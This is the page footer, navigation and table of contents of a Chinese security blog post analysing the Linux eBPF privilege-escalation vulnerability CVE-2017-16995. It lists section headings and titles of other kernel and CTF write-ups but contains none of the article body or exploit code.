            <span class="copy-path" data-clipboard-text="原文: http://p4nda.top/2019/01/18/CVE-2017-16995/　　作者: P4nda" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



    <nav id="article-nav">
        
            <div id="article-nav-newer" class="article-nav-title">
                <a href="/2019/02/16/CVE-2017-7184/">
                    Linux xfrm模块越界读写提权漏洞分析（CVE-2017-7184）
                </a>
            </div>
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/2019/01/02/kernel-bpf-overflow/">
                    Linux kernel 4.20 BPF 整数溢出漏洞分析
                </a>
            </div>
        
    </nav>

  
</article>

    <div id="toc" class="toc-article">
        <strong class="toc-title">文章目录</strong>
        
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#EBPF模块分析"><span class="toc-number">1.</span> <span class="toc-text">EBPF模块分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#EBPF指令集介绍"><span class="toc-number">1.1.</span> <span class="toc-text">EBPF指令集介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BPF-MAP-CREATE"><span class="toc-number">1.2.</span> <span class="toc-text">BPF_MAP_CREATE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BPF-PROG-LOAD"><span class="toc-number">1.3.</span> <span class="toc-text">BPF_PROG_LOAD</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bpf-prog-load"><span class="toc-number">1.3.1.</span> <span class="toc-text">bpf_prog_load</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bpf-check"><span class="toc-number">1.3.2.</span> <span class="toc-text">bpf_check</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#replace-map-fd-with-map-ptr"><span class="toc-number">1.3.3.</span> <span class="toc-text">replace_map_fd_with_map_ptr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#do-check"><span class="toc-number">1.3.4.</span> <span class="toc-text">do_check</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Q-amp-A1：for循环如何会检查结束并退出"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">Q&amp;A1：for循环如何会检查结束并退出</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Q-amp-A2：能否进行直接的内存读写？"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">Q&amp;A2：能否进行直接的内存读写？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bpf-prog-run"><span class="toc-number">1.4.</span> <span class="toc-text">__bpf_prog_run</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞利用"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#利用整数扩展问题绕过bpf-check"><span class="toc-number">2.1.</span> <span class="toc-text">利用整数扩展问题绕过bpf_check</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用-1"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#相关代码"><span class="toc-number">3.</span> <span class="toc-text">相关代码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">3.1.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ebpf-tool"><span class="toc-number">3.2.</span> <span class="toc-text">ebpf_tool</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-3 i,
        .toc-level-3 ol {
            display: none !important;
        }
    </style>

    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

    <script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
    </script>



    
<div class="share">
    
        <div class="bdsharebuttonbox">
            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
        </div>
        <script>
            window._bd_share_config={
                "common":{"bdSnsKey":{},"bdText":"Linux ebpf模块整数扩展问题导致提权漏洞分析（CVE-2017-16995）　| p4nda's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>
    

    
</div>







    
        <section id="comments">
    <style> aside.comment-bar { margin: auto 30px; }</style>
    <div id="disqus_thread"></div>
    <script>
        var disqus_config = function(){
            this.page.url = 'http://p4nda.top/2019/01/18/CVE-2017-16995/';
            this.page.identifier = '2019/01/18/CVE-2017-16995/';
        };
        var loadComment = function(){
            var d = document, s = d.createElement('script');
            s.src = '//p4nda.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        }
    </script>
    
    <script> loadComment(); </script>

</section>


    




    <div class="scroll" id="post-nav-button">
        
            <a href="/2019/02/16/CVE-2017-7184/" title="上一篇: Linux xfrm模块越界读写提权漏洞分析（CVE-2017-7184）">
                <i class="fa fa-angle-left"></i>
            </a>
        

        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/2019/01/02/kernel-bpf-overflow/" title="下一篇: Linux kernel 4.20 BPF 整数溢出漏洞分析">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/05/01/starctf-2019-hackme/">【KERNEL PWN】STARCTF 2019 hackme 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/16/CVE-2017-7184/">Linux xfrm模块越界读写提权漏洞分析（CVE-2017-7184）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/18/CVE-2017-16995/">Linux ebpf模块整数扩展问题导致提权漏洞分析（CVE-2017-16995）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/02/kernel-bpf-overflow/">Linux kernel 4.20 BPF 整数溢出漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/06/xnuca-final-paraweb/">X-NUCA'2018 Final paraweb解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/27/wctf-2018-klist/">【KERNEL PWN】WCTF 2018 klist解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/26/XNUCA-secretcenter/">X-NUCA'2018 secretcenter 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/07/stringipc/">【KERNEL PWN】从内存任意读写到权限提升</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/14/hwb-ctf-2018/">护网杯 CTF 2018线上预选赛PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/11/ciscn-2017-babydriver/">【KERNEL PWN】CISCN 2017 babydriver题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/27/WDBCTF-2018/">网鼎杯CTF部分PWN题复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/27/CISCN-Final/">CISCN 2018 Final赛记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/20/0ctf-baby/">【KERNEL PWN】0ctf 2018 final baby题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/13/ciscn2018-core/">【KERNEL PWN】强网杯CTF2018 core题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/11/WCTF-2018/">【WCTF 2018】parrot_revenge 题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/02/patch-in-pwn/">CTF线下赛中常用的PWN题patch方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/28/pwnable-tw-wannaheap/">【PWNABLE.TW】 wannaheap 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/25/pwnhub_Panda's_gift/">胖哈勃Panda's gift 及 TSCTF 2018 FINAL出题笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/29/suctf2018/">SUCTF 2018部分PWN题复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/ciscn-ctf-2018/">全国大学生信息安全竞赛（CISCN）解题赛部分PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/18/house-of-rabbit/">House Of Rabbit 原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/17/hitb2018/">HITB gsec CTF Qual 2018 部分PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/04/kernel-pwn-start/">CTF KETNEL PWN 入门记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/04/0ctf2018/">0ctf 2018 PWN 部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/27/QWB2018/">QWBCTF 2018 PWN 部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/20/tcache/">tcache 源码分析及利用思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/15/n1ctf2018/">N1CTF 2018 && 线程堆知识源代码分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/hgame/">HGAME 2018 PWN题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/03/question/">问题解决及工具使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/05/hitctf/">HITCTF 2018 PWN 题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/15/pwnable-tw-bookwriter/">【PWNABLE.TW】 BookWriter 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/06/pwnable-tw-alivenote/">【PWNABLE.TW】 alive_note 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/13/pwnable-tw-starbound/">【PWNABLE.TW】 starbound 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/29/pwnable-tw-deathnote/">【PWNABLE.TW】 deathnote 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/20/pwnable-tw-seethefile/">【PWNABLE.TW】 seethefile 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/14/pwnable-tw-applestore/">【PWNABLE.TW】 applestore 解题思路</a></li></ul>




    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2017-2019 P4nda
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
	 <div id="landlord">
		  <div class="message" style="opacity:0"></div>
		  <canvas id="live2d" width="280" height="250" class="live2d"></canvas>
		  <div class="hide-button">隐藏</div>
	  </div>
			</div>

        </div>
		<!-- 血小板 -->

<script type="text/javascript" src="https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
    var message_Path = '/live2d/'
    var home_Path = 'https://haremu.com/'
</script>
<script type="text/javascript" src="/live2d/js/live2d.js"></script>
<script type="text/javascript" src="/live2d/js/message.js"></script>
<script type="text/javascript">
    loadlive2d("live2d", "/live2d/model/xiaoban/model.json");
</script>  
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>| </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        		
    </div>
	
</footer>
    </div>
    
    <script src="/js/GithubRepoWidget.js"></script>

<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>





<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
             github: ".github-widget a", 
            
            
            
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

    <script>
        var originTitle = document.title;
        var titleTime;
        document.addEventListener("visibilitychange", function() {
            if (document.hidden) {
                document.title = "(つェ⊂) 天黑了~ " + originTitle;
                clearTimeout(titleTime);
            }
            else {
                document.title = "(*´∇｀*) 天亮了~ " + originTitle;
                titleTime = setTimeout(function() {
                    document.title = originTitle;
                }, 2000);
            }
        })
    </script>

<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  </div>
</body>
</html>